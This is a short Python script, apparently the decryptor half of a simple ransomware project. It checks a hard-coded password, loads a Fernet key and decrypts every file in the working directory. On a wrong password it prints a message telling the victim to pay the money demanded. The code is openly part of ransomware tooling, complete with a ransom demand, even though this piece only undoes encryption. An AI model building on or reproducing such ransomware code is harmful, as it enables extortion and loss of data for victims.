#!usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []
password = "password"

user_input = input("Please provide the password to decrypt your files:\n")

if user_input == password:
    with open("encKey.key", "rb") as key:
        secretKey = key.read()
    for file in os.listdir():
        if file != "simple_ransomware.py" and file != "encKey.key" and file != "simple_ransomware_decryption.py":
            if os.path.isfile(file):
                files.append(file)
    for file in files:
        with open(file, "rb") as targetFile:
            fileContent = targetFile.read()
        fileContent_decrypted = Fernet(secretKey).decrypt(fileContent)
        with open(file, "wb") as targetFile:
            targetFile.write(fileContent_decrypted)
    print("Congratulations, your files are now decrypted and are back to normal.")
else:
    print("Sorry, that is not the correct password. Please send the $ that was askied to decrypt your files.")
